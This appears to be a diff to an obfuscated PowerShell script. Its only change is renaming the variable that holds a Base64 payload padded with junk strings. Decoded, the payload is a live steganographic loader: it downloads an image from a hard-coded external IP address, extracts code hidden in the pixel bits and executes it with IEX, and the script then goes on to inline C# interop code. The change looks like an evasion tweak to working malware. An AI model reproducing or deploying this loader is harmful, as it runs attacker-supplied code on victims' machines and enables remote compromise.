@@ -1,10 +1,10 @@
-$Encrypt = @'
+$reb = @'
 c2FsIGEgTmV3LU!@#$%^&@#$%^@#$%^@#$%^&*(9iamVjdDtBZGQtV!@#$%^&@#$%^@#$%^@#$%^&*(HlwZSAtQSBTeXN0ZW0uRHJhd2l!@#$%^&@#$%^@#$%^@#$%^&*(uZzskZz1hIFN5c3RlbS!@#$%^&@#$%^@#$%^@#$%^&*(5EcmF3aW5nLkJpdG1hcCgoYSBOZXQuV2ViQ2xpZW50KS5PcGVuUmVhZCgiaHR0cDovL
 zExMC40Mi4xMzUuMjA4OjgwLzQ1Ni5qcGciKSk7JG89YSBCeXRlW10gMzUzMjgwOygwLi4xODMpfCV7Zm9yZWFjaCgkeCBpbigwLi4xOTE5KSl7JHA9JGcuR2V0UGl4ZWwoJHgsJF8pOyR
 vWyRfKjE5MjArJHhdPShbbWF0aF06OkZsb29yKCgkcC5CLW!@#$%^&@#$%^@#$%^@#$%^&*(JhbmQxNSkqMTYpLWJvcigkcC5HIC1iYW5kIDE1KSl9!@#$%^&@#$%^@#$%^@#$%^&*(fTtJRVgoW1N5c3RlbS5UZXh0Lk!@#$%^&@#$%^@#$%^@#$%^&*(VuY29kaW5nXTo6QVNDSUkuR2V0U3
 RyaW5nKCRvWz!@#$%^&@#$%^@#$%^@#$%^&*(AuLjM1MjU3MF0pKQ==
 '@.Replace('!@#$%^&@#$%^@#$%^@#$%^&*(','')
-$Decryption= [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($Encrypt))
+$Decryption= [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($reb))
 $dcvrj = @"
 using System;
 using System.Runtime.InteropServices;
